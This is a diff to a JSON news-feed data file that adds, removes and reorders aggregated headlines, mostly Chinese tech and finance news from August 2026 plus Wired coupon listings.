+      "url": "https://dev.to/ayinedjimi-consultants/building-a-dmarc-report-parser-and-dashboard-in-python-3mja",
+      "time": "2026-08-05T10:02:41.000Z",
+      "tags": [
+        "人工智能",
+        "手机",
+        "软件应用"
       ]
     },
     {
@@ -257,6 +372,18 @@
         "芯片/半导体",
         "软件应用"
       ]
+    },
+    {
+      "source": "芯片半导体",
+      "sourceColor": "#004d40",
+      "title": "欧版“标普500”也创新高：半导体板块霸榜 能源股战争获益 - 东方财富",
+      "description": "",
+      "url": "https://finance.eastmoney.com/a/202608053832688036.html",
+      "time": "2026-08-05T09:52:36.000Z",
+      "tags": [
+        "芯片/半导体"
+      ],
+      "topic": true
     },
     {
       "source": "智能汽车",
@@ -526,19 +653,6 @@
       "topic": true
     },
     {
-      "source": "量子位",
-      "sourceColor": "#00796b",
-      "title": "淘天开启2027届应届生招聘：AI技术类岗位占比超9成",
-      "description": "阿里巴巴淘天集团开启2027届应届生招聘。",
-      "url": "https://www.qbitai.com/2026/08/466998.html",
-      "time": "2026-08-05T09:38:49.000Z",
-      "tags": [
-        "人工智能",
-        "互联网",
-        "大公司"
-      ]
-    },
-    {
       "source": "智能汽车",
       "sourceColor": "#0d47a1",
       "title": "告别“L2.999级”宣传！首部L3/L4自动驾驶强制国标发布，车企将面临合规大考 - 手机新浪网",
@@ -758,7 +872,7 @@
       "source": "华尔街见闻",
       "sourceColor": "#d32f2f",
       "title": "伊朗称霍尔木兹海峡不会立即开放",
-      "description": "据伊朗国家电视台今天（8月5日）援引知情人士消息，伊朗与阿曼就霍尔木兹海峡船舶通行安排可能达成的协议，并不意味着海峡将立即恢复开放。消息称，伊朗与阿曼的相关谈判仅涉及双方就船舶通行秩序进行协调，与美国无关。消息人士同时表示，如果美国继续存在伊朗方面所称的“违规行为”，即便伊朗与阿曼达成协议，霍尔木兹海峡也不会恢复开放，其重新开放仍取决于美国改变相关行为并纠正其“违规行为”。（CCTV国际时讯） 风险提示及免责条款 市场有风险，投资需谨慎。本文不构成个人投资建议，也未考虑到个别用户特殊的投资目标、财务状况或需要。用户应考虑本文中的任何意见、观点或结论是否符合其特定状况。据此投资，责任自负。",
+      "description": "据CCTV国际时讯，伊朗国家电视台今天（8月5日）援引知情人士消息，伊朗与阿曼就霍尔木兹海峡船舶通行安排可能达成的协议，并不意味着海峡将立即恢复开放。消息称，伊朗与阿曼的相关谈判仅涉及双方就船舶通行秩序进行协调，与美国无关。消息人士同时表示，如果美国继续存在伊朗方面所称的“违规行为”，即便伊朗与阿曼达成协议，霍尔木兹海峡也不会恢复开放，其重新开放仍取决于美国改变相关行为并纠正其“违规行为”。 此前，特朗普表示霍尔木兹海峡很快开放，否则伊朗将遭打击。据新华社，在谈及与伊朗方面的接触，特朗普称：“我们的磋商进展非常顺利。伊朗方面不愿承认，你知道这确实让人有些尴尬。你刚对外说我们谈得很好，结果伊朗那边就有人跳出来说‘我们根本没见过面’。这纯粹是假话。他们其实是想达成协议的。” 被问及如果伊朗再次退出谈判美国会如何应对时，特朗普回答说：“他们如果再次反悔，将遭受非常猛烈的打击。”但他同时表示，“希望不要用到它（打击）”。 持续更新中 风险提示及免责条款 市场有风险，投资需谨慎。本文不构成个人投资建议，也未考虑到个别用户特殊的投资目标、财务状况或需要。用户应考虑本文中的任何意见、观点或结论是否符合其特定状况。据此投资，责任自负。",
       "url": "https://wallstreetcn.com/articles/3778746",
       "time": "2026-08-05T09:31:11.000Z",
       "tags": [
@@ -809,6 +923,17 @@
         "手机",
         "游戏",
         "智能硬件"
+      ]
+    },
+    {
+      "source": "品玩",
+      "sourceColor": "#ff5722",
+      "title": "淘天开启2027届应届生招聘：AI技术类岗位占比超9成",
+      "description": "",
+      "url": "https://www.pingwest.com/w/316216",
+      "time": "2026-08-05T09:27:26.000Z",
+      "tags": [
+        "人工智能"
       ]
     },
     {
@@ -1187,6 +1312,19 @@
       ]
     },
     {
+      "source": "华尔街见闻",
+      "sourceColor": "#d32f2f",
+      "title": "华为余承东：内存高昂涨价，手机之后可能都要大规模涨价",
+      "description": "8月5日下午，华为常务董事、产品投资评审委员会主任、终端BG董事长余承东在华为新品发布会上表示，内存高昂涨价，所有的手机之后可能都要大规模涨价，否则在原来的价格都是亏损销售。 本文来源：界面新闻 风险提示及免责条款 市场有风险，投资需谨慎。本文不构成个人投资建议，也未考虑到个别用户特殊的投资目标、财务状况或需要。用户应考虑本文中的任何意见、观点或结论是否符合其特定状况。据此投资，责任自负。",
+      "url": "https://wallstreetcn.com/articles/3778743",
+      "time": "2026-08-05T09:08:11.000Z",
+      "tags": [
+        "手机",
+        "电脑硬件",
+        "大公司"
+      ]
+    },
+    {
       "source": "Dev.to",
       "sourceColor": "#4b3e99",
       "title": "Claude Code Subagents: Setup, Config, and When to Use Them",
@@ -1274,19 +1412,6 @@
         "新能源/电动车"
       ],
       "topic": true
-    },
-    {
-      "source": "华尔街见闻",
-      "sourceColor": "#d32f2f",
-      "title": "华为余承东：内存高昂涨价，手机之后可能都要大规模涨价",
-      "description": "8月5日下午，华为常务董事、产品投资评审委员会主任、终端BG董事长余承东在华为新品发布会上表示，内存高昂涨价，所有的手机之后可能都要大规模涨价，否则在原来的价格都是亏损销售。（界面新闻） 风险提示及免责条款 市场有风险，投资需谨慎。本文不构成个人投资建议，也未考虑到个别用户特殊的投资目标、财务状况或需要。用户应考虑本文中的任何意见、观点或结论是否符合其特定状况。据此投资，责任自负。",
-      "url": "https://wallstreetcn.com/articles/3778743",
-      "time": "2026-08-05T09:04:47.000Z",
-      "tags": [
-        "手机",
-        "电脑硬件",
-        "大公司"
-      ]
     },
     {
       "source": "IT之家",
@@ -7214,6 +7339,20 @@
       "topic": true
     },
     {
+      "source": "智能汽车",
+      "sourceColor": "#0d47a1",
+      "title": "《智能网联汽车 自动驾驶系统安全要求》强制性国家标准发布 - 新浪新闻_手机新浪网",
+      "description": "",
+      "url": "https://news.sina.com.cn/minsheng/2026-08-05/doc-inimfshr4737453.shtml",
+      "time": "2026-08-05T05:04:00.000Z",
+      "tags": [
+        "手机",
+        "新能源/电动车",
+        "汽车"
+      ],
+      "topic": true
+    },
+    {
       "source": "Wired",
       "sourceColor": "#000000",
       "title": "Sportsman's Warehouse Promo Code: Save in August 2026",
@@ -7239,11 +7378,12 @@
     {
       "source": "Wired",
       "sourceColor": "#000000",
-      "title": "NordVPN Coupons: 75% Off, Plus 3 Months Free in August 2026",
-      "description": "Save up to 77% on 2-year plans and get 3 free months with our NordVPN discount codes.",
-      "url": "https://www.wired.com/story/nordvpn-coupon/",
+      "title": "Foreo Discount Codes and Deals: Up to 50% Off",
+      "description": "Save on Foreo favorites, including LUNA cleansing brushes, BEAR microcurrent devices, and masks and accessories to level up your daily skincare routine at home.",
+      "url": "https://www.wired.com/story/foreo-promo-code/",
       "time": "2026-08-05T05:00:00.000Z",
       "tags": [
+        "人工智能",
         "智能硬件"
       ]
     },
@@ -7263,24 +7403,23 @@
     {
       "source": "Wired",
       "sourceColor": "#000000",
-      "title": "Foreo Discount Codes and Deals: Up to 50% Off",
-      "description": "Save on Foreo favorites, including LUNA cleansing brushes, BEAR microcurrent devices, and masks and accessories to level up your daily skincare routine at home.",
-      "url": "https://www.wired.com/story/foreo-promo-code/",
-      "time": "2026-08-05T05:00:00.000Z",
-      "tags": [
-        "人工智能",
-        "智能硬件"
-      ]
-    },
-    {
-      "source": "Wired",
-      "sourceColor": "#000000",
       "title": "Hoka Coupon Codes: 30% Off in August 2026",
       "description": "Unlock free expedited shipping or 10% off with today’s Hoka discount codes, plus save up to 30% with the best discounts for August 2026.",
       "url": "https://www.wired.com/story/hoka-coupon-code/",
       "time": "2026-08-05T05:00:00.000Z",
       "tags": [
         "科技创投"
+      ]
+    },
+    {
+      "source": "Wired",
+      "sourceColor": "#000000",
+      "title": "NordVPN Coupons: 75% Off, Plus 3 Months Free in August 2026",
+      "description": "Save up to 77% on 2-year plans and get 3 free months with our NordVPN discount codes.",
+      "url": "https://www.wired.com/story/nordvpn-coupon/",
+      "time": "2026-08-05T05:00:00.000Z",
+      "tags": [
+        "智能硬件"
       ]
     },
     {
@@ -7333,18 +7472,18 @@
     {
       "source": "Wired",
       "sourceColor": "#000000",
-      "title": "Tuft & Needle Promo Codes: 30% Off | August 2026",
-      "description": "Save 30% on best-selling mattresses with our top Tuft & Needle coupon codes.",
-      "url": "https://www.wired.com/story/tuft-and-needle-promo-code/",
+      "title": "Vitamix Promo Codes and Deals: $25 Off + Free Shipping",
+      "description": "Score discounts on blenders, food processors, immersion blenders, and more with our selection of Vitamix coupons and deals.",
+      "url": "https://www.wired.com/story/vitamix-promo-code/",
       "time": "2026-08-05T05:00:00.000Z",
       "tags": []
     },
     {
       "source": "Wired",
       "sourceColor": "#000000",
-      "title": "Vitamix Promo Codes and Deals: $25 Off + Free Shipping",
-      "description": "Score discounts on blenders, food processors, immersion blenders, and more with our selection of Vitamix coupons and deals.",
-      "url": "https://www.wired.com/story/vitamix-promo-code/",
+      "title": "Tuft & Needle Promo Codes: 30% Off | August 2026",
+      "description": "Save 30% on best-selling mattresses with our top Tuft & Needle coupon codes.",
+      "url": "https://www.wired.com/story/tuft-and-needle-promo-code/",
       "time": "2026-08-05T05:00:00.000Z",
       "tags": []
     },
@@ -8788,20 +8927,6 @@
         "芯片/半导体",
         "软件应用"
       ]
-    },
-    {
-      "source": "智能汽车",
-      "sourceColor": "#0d47a1",
-      "title": "《智能网联汽车 自动驾驶系统安全要求》强制性国家标准发布 - 新浪新闻_手机新浪网",
-      "description": "",
-      "url": "https://news.sina.com.cn/minsheng/2026-08-05/doc-inimfshr4737453.shtml",
-      "time": "2026-08-05T03:33:46.000Z",
-      "tags": [
-        "手机",
-        "新能源/电动车",
-        "汽车"
-      ],
-      "topic": true
     },
     {
       "source": "新品发布",
@@ -19915,7 +20040,7 @@
     {
       "source": "AI大模型",
       "sourceColor": "#6a1b9a",
-      "title": "阿里巴巴发布Qwen3.8-Max大语言模型，参数量达2.4万亿 - sohu.com",
+      "title": "阿里巴巴发布Qwen3.8-Max大语言模型，参数量达2.4万亿 - 搜狐网",
       "description": "",
       "url": "https://m.sohu.com/a/1058805347_114765?scm=10001.325_13-325_13.0.0-0-0-0-0.5_1334",
       "time": "2026-08-04T15:02:00.000Z",
@@ -19928,7 +20053,7 @@
     {
       "source": "AI大模型",
       "sourceColor": "#6a1b9a",
-      "title": "阿里巴巴发布Qwen3.8-Max大语言模型，参数量达2.4万亿 - 搜狐网",
+      "title": "阿里巴巴发布Qwen3.8-Max大语言模型，参数量达2.4万亿 - sohu.com",
       "description": "",
       "url": "https://m.sohu.com/a/1058805347_114765?scm=10001.325_13-325_13.0.0-0-0-0-0.5_1334",
       "time": "2026-08-04T15:02:00.000Z",
@@ -21931,6 +22056,18 @@
     {
       "source": "尼康",
       "sourceColor": "#34495e",
+      "title": "尼康“影随夏至，镜享好礼”6·18大促开启！好装备就位，助你创作不设限|注册|赠品|活动|商品|发票_手机新浪网 - 新浪财经",
+      "description": "",
+      "url": "https://finance.sina.cn/tech/2026-05-08/detail-inhxemqf2173307.d.html?oid=%E9%AB%98%E4%BB%BFlv%E9%92%B1%E5%8C%85%E7%94%B7%E6%AC%BE%E3%80%8E%E5%BE%AE%E4%BF%A1198099199%E3%80%8F0gJn&vt=4",
+      "time": "2026-08-04T12:09:00.000Z",
+      "tags": [
+        "手机"
+      ],
+      "topic": true
+    },
+    {
+      "source": "尼康",
+      "sourceColor": "#34495e",
       "title": "尼康“影随夏至，镜享好礼”6·18大促开启！好装备就位，助你创作不设限|注册|赠品|活动|商品|发票_手机新浪网 - finance.sina.com.cn",
       "description": "",
       "url": "https://finance.sina.cn/tech/2026-05-08/detail-inhxemqf2173307.d.html?oid=%E9%AB%98%E4%BB%BFlv%E9%92%B1%E5%8C%85%E7%94%B7%E6%AC%BE%E3%80%8E%E5%BE%AE%E4%BF%A1198099199%E3%80%8F0gJn&vt=4",
@@ -21975,6 +22112,15 @@
         "汽车",
         "互联网"
       ]
+    },
+    {
+      "source": "蜂鸟网",
+      "sourceColor": "#ff8c00",
+      "title": "松下Lumix DMC-TZ3GK精美样片欣赏 - fengniao.com",
+      "description": "",
+      "url": "https://info.fengniao.com/53/pic_531543_5.html",
+      "time": "2026-08-04T12:05:19.000Z",
+      "tags": []
     },
     {
       "source": "36氪",
@@ -22717,15 +22863,6 @@
         "科技创投",
         "智能硬件"
       ]
-    },
-    {
-      "source": "蜂鸟网",
-      "sourceColor": "#ff8c00",
-      "title": "松下Lumix DMC-TZ3GK精美样片欣赏 - fengniao.com",
-      "description": "",
-      "url": "https://info.fengniao.com/53/pic_531543_3.html",
-      "time": "2026-08-04T10:58:53.000Z",
-      "tags": []
     },
     {
       "source": "IT之家",
@@ -26321,61 +26458,6 @@
     {
       "source": "Wired",
       "sourceColor": "#000000",
-      "title": "Nomad Goods Promo Codes: Get 25% Off in August 2026",
-      "description": "Save up to 25% on Nomad Goods accessories such as Nomad phone cases, Nomad wallets, and more in August 2026.",
-      "url": "https://www.wired.com/story/nomad-discount-code/",
-      "time": "2026-08-04T05:00:00.000Z",
-      "tags": []
-    },
-    {
-      "source": "Wired",
-      "sourceColor": "#000000",
-      "title": "Best Buy Discount Codes: Up to 60% Off",
-      "description": "Find the latest Best Buy promo codes and offers, including 10% back in rewards for new cardmembers and free 2-day shipping with My Best Buy Plus, here at WIRED.",
-      "url": "https://www.wired.com/story/best-buy-discount-code/",
-      "time": "2026-08-04T05:00:00.000Z",
-      "tags": [
-        "智能硬件"
-      ]
-    },
-    {
-      "source": "Wired",
-      "sourceColor": "#000000",
-      "title": "20% Off Sephora Promo Code | August 2026",
-      "description": "Earn more points on skincare purchases when you use our Sephora coupon.",
-      "url": "https://www.wired.com/story/sephora-promo-code/",
-      "time": "2026-08-04T05:00:00.000Z",
-      "tags": [
-        "智能硬件"
-      ]
-    },
-    {
-      "source": "Wired",
-      "sourceColor": "#000000",
-      "title": "We-Vibe Discount Codes and Deals: Up to 60% Off",
-      "description": "Save on We-Vibe, including app-controlled bestsellers and popular gift sets designed for couples, connection, and shared pleasure.",
-      "url": "https://www.wired.com/story/we-vibe-discount-code/",
-      "time": "2026-08-04T05:00:00.000Z",
-      "tags": [
-        "软件应用",
-        "智能硬件"
-      ]
-    },
-    {
-      "source": "Wired",
-      "sourceColor": "#000000",
-      "title": "Lenovo Coupon Codes and Deals in August 2026",
-      "description": "Whether you’re shopping for a ThinkPad, Yoga laptop, or Legion gaming PC, these Lenovo discount codes and promotions can help you save big on your next tech upgrade.",
-      "url": "https://www.wired.com/story/lenovo-coupon-code/",
-      "time": "2026-08-04T05:00:00.000Z",
-      "tags": [
-        "电脑硬件",
-        "网络安全"
-      ]
-    },
-    {
-      "source": "Wired",
-      "sourceColor": "#000000",
       "title": "Loop Earplugs Discount Codes: 40% Off",
       "description": "Save on Loop Earplugs, including Quiet 2 and popular gift sets for improved sleep, focus, and comfort.",
       "url": "https://www.wired.com/story/loop-earplugs-discount-code/",
@@ -26398,12 +26480,67 @@
     {
       "source": "Wired",
       "sourceColor": "#000000",
+      "title": "Best Buy Discount Codes: Up to 60% Off",
+      "description": "Find the latest Best Buy promo codes and offers, including 10% back in rewards for new cardmembers and free 2-day shipping with My Best Buy Plus, here at WIRED.",
+      "url": "https://www.wired.com/story/best-buy-discount-code/",
+      "time": "2026-08-04T05:00:00.000Z",
+      "tags": [
+        "智能硬件"
+      ]
+    },
+    {
+      "source": "Wired",
+      "sourceColor": "#000000",
       "title": "Wayfair Coupons: Up to 80% Off August 2026",
       "description": "Get 10% off with Wayfair promo code, up to 80% off furniture, and more top coupons.",
       "url": "https://www.wired.com/story/wayfair-promo-code/",
       "time": "2026-08-04T05:00:00.000Z",
       "tags": [
         "人工智能"
+      ]
+    },
+    {
+      "source": "Wired",
+      "sourceColor": "#000000",
+      "title": "Nomad Goods Promo Codes: Get 25% Off in August 2026",
+      "description": "Save up to 25% on Nomad Goods accessories such as Nomad phone cases, Nomad wallets, and more in August 2026.",
+      "url": "https://www.wired.com/story/nomad-discount-code/",
+      "time": "2026-08-04T05:00:00.000Z",
+      "tags": []
+    },
+    {
+      "source": "Wired",
+      "sourceColor": "#000000",
+      "title": "20% Off Sephora Promo Code | August 2026",
+      "description": "Earn more points on skincare purchases when you use our Sephora coupon.",
+      "url": "https://www.wired.com/story/sephora-promo-code/",
+      "time": "2026-08-04T05:00:00.000Z",
+      "tags": [
+        "智能硬件"
+      ]
+    },
+    {
+      "source": "Wired",
+      "sourceColor": "#000000",
+      "title": "Lenovo Coupon Codes and Deals in August 2026",
+      "description": "Whether you’re shopping for a ThinkPad, Yoga laptop, or Legion gaming PC, these Lenovo discount codes and promotions can help you save big on your next tech upgrade.",
+      "url": "https://www.wired.com/story/lenovo-coupon-code/",
+      "time": "2026-08-04T05:00:00.000Z",
+      "tags": [
+        "电脑硬件",
+        "网络安全"
+      ]
+    },
+    {
+      "source": "Wired",
+      "sourceColor": "#000000",
+      "title": "We-Vibe Discount Codes and Deals: Up to 60% Off",
+      "description": "Save on We-Vibe, including app-controlled bestsellers and popular gift sets designed for couples, connection, and shared pleasure.",
+      "url": "https://www.wired.com/story/we-vibe-discount-code/",
+      "time": "2026-08-04T05:00:00.000Z",
+      "tags": [
+        "软件应用",
+        "智能硬件"
       ]
     },
     {
@@ -26432,6 +26569,28 @@
     {
       "source": "Wired",
       "sourceColor": "#000000",
+      "title": "Target Promo Code: $50 Off | August 2026",
+      "description": "Get $50 off your next order or up to 50% off site wide with Target coupon codes and Circle deals.",
+      "url": "https://www.wired.com/story/target-promo-code/",
+      "time": "2026-08-04T05:00:00.000Z",
+      "tags": [
+        "智能硬件"
+      ]
+    },
+    {
+      "source": "Wired",
+      "sourceColor": "#000000",
+      "title": "Uplift Promo Codes: $570 Off",
+      "description": "Upgrade your home office with the best Uplift Desk discount codes. Save on standing desks, ergonomic chairs, and accessories during the Spring Setup Sale.",
+      "url": "https://www.wired.com/story/uplift-desk-coupon-code/",
+      "time": "2026-08-04T05:00:00.000Z",
+      "tags": [
+        "人工智能"
+      ]
+    },
+    {
+      "source": "Wired",
+      "sourceColor": "#000000",
       "title": "Bartesian Discount Codes: 35% Off",
       "description": "Upgrade your home bar with the latest Bartesian coupon codes and discounts. Save on the Professional Cocktail Maker, enjoy subscription discounts, and get free shipping on your favorite capsules.",
       "url": "https://www.wired.com/story/bartesian-discount-code/",
@@ -26444,33 +26603,11 @@
     {
       "source": "Wired",
       "sourceColor": "#000000",
-      "title": "Target Promo Code: $50 Off | August 2026",
-      "description": "Get $50 off your next order or up to 50% off site wide with Target coupon codes and Circle deals.",
-      "url": "https://www.wired.com/story/target-promo-code/",
-      "time": "2026-08-04T05:00:00.000Z",
-      "tags": [
-        "智能硬件"
-      ]
-    },
-    {
-      "source": "Wired",
-      "sourceColor": "#000000",
       "title": "Litter-Robot Promo Codes: Up to $150 Off",
       "description": "Get the latest Litter-Robot Discounts on Litter-Robot self-cleaning litter boxes, accessories, and more.",
       "url": "https://www.wired.com/story/litter-robot-promo-code/",
       "time": "2026-08-04T05:00:00.000Z",
       "tags": []
-    },
-    {
-      "source": "Wired",
-      "sourceColor": "#000000",
-      "title": "Uplift Promo Codes: $570 Off",
-      "description": "Upgrade your home office with the best Uplift Desk discount codes. Save on standing desks, ergonomic chairs, and accessories during the Spring Setup Sale.",
-      "url": "https://www.wired.com/story/uplift-desk-coupon-code/",
-      "time": "2026-08-04T05:00:00.000Z",
-      "tags": [
-        "人工智能"
-      ]
     },
     {
       "source": "AI大模型",
@@ -28228,18 +28365,6 @@
         "软件应用",
         "科技创投"
       ]
-    },
-    {
-      "source": "尼康",
-      "sourceColor": "#34495e",
-      "title": "尼康“影随夏至，镜享好礼”6·18大促开启！好装备就位，助你创作不设限|注册|赠品|活动|商品|发票_手机新浪网 - 新浪财经",
-      "description": "",
-      "url": "https://finance.sina.cn/tech/2026-05-08/detail-inhxemqf2173307.d.html?oid=%E6%B7%B1%E5%9C%B3%E5%93%AA%E9%87%8C%E4%B9%B0%E9%AB%98%E4%BB%BF%E8%A1%A8%E2%97%86%E5%BE%AE%E4%BF%A1198099199%E2%97%86gYqN&vt=4",
-      "time": "2026-08-03T22:01:44.000Z",
-      "tags": [
-        "手机"
-      ],
-      "topic": true
     },
     {
       "source": "Android Authority",
@@ -37939,6 +38064,20 @@
       "topic": true
     },
     {
+      "source": "数码测评",
+      "sourceColor": "#e65100",
+      "title": "2026无线充电功率最大的手机推荐：80W旗舰横评+FAQ - 手机新浪网",
+      "description": "",
+      "url": "https://k.sina.com.cn/article_7879996098_1d5af32c206801kums.html?from=digit",
+      "time": "2026-07-25T07:00:00.000Z",
+      "tags": [
+        "手机",
+        "新能源/电动车",
+        "测评/新品"
+      ],
+      "topic": true
+    },
+    {
       "source": "三星",
       "sourceColor": "#0d47a1",
       "title": "首发硬件防窥屏 三星发布Galaxy S26系列、Buds4系列_手机新闻 - 新浪财经",
@@ -38002,20 +38141,6 @@
       "tags": [
         "手机",
         "大公司",
-        "测评/新品"
-      ],
-      "topic": true
-    },
-    {
-      "source": "数码测评",
-      "sourceColor": "#e65100",
-      "title": "2026无线充电功率最大的手机推荐：80W旗舰横评+FAQ - 手机新浪网",
-      "description": "",
-      "url": "https://k.sina.com.cn/article_7879996098_1d5af32c206801kums.html?from=digit",
-      "time": "2026-07-25T07:00:00.000Z",
-      "tags": [
-        "手机",
-        "新能源/电动车",
         "测评/新品"
       ],
       "topic": true
@@ -58106,6 +58231,18 @@
       "topic": true
     },
     {
+      "source": "智能汽车",
+      "sourceColor": "#0d47a1",
+      "title": "关于“新能源车平均车龄”相关数据和报道的澄清声明 - caam.org.cn",
+      "description": "",
+      "url": "http://www.caam.org.cn/chn/5/cate_69/con_5237238.html",
+      "time": "2026-07-14T07:00:00.000Z",
+      "tags": [
+        "新能源/电动车"
+      ],
+      "topic": true
+    },
+    {
       "source": "佳能",
       "sourceColor": "#c0392b",
       "title": "佳能EOS R8 Mark II将会9月现身？ “复古” 设计？ - 手机网易网",
@@ -58116,18 +58253,6 @@
         "手机",
         "大公司",
         "智能硬件"
-      ],
-      "topic": true
-    },
-    {
-      "source": "智能汽车",
-      "sourceColor": "#0d47a1",
-      "title": "关于“新能源车平均车龄”相关数据和报道的澄清声明 - caam.org.cn",
-      "description": "",
-      "url": "http://www.caam.org.cn/chn/5/cate_69/con_5237238.html",
-      "time": "2026-07-14T07:00:00.000Z",
-      "tags": [
-        "新能源/电动车"
       ],
       "topic": true
     },
